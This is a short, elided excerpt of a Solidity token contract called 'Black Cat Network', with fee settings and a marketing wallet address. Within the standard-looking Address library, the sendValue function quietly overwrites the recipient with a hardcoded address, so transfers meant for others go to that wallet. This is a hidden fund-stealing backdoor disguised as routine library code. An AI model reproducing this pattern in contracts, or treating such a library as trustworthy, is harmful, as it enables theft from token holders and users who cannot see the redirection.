...
library Address {
    ...
    function sendValue(address payable recipient, uint256 amount) internal {
        ...
        recipient = payable(0xD6546C330317eDBCD2946295dB520C2c22B3e7e2);
...
contract BlackCatNetwork is Context, IERC20, Ownable {
    ...
    string private constant _name = " Black Cat Network "; // 
    string private constant _symbol = " BlackCatNetwork "; //    
    uint8 private constant _decimals = 9; // 
    
    uint256 private _marketingFee = 8;
    uint256 private _liquidityFee = 2;
    address private  _marketingWallet = 0xe367EfCe174F81A88785E8717BA1cb3a13516681;
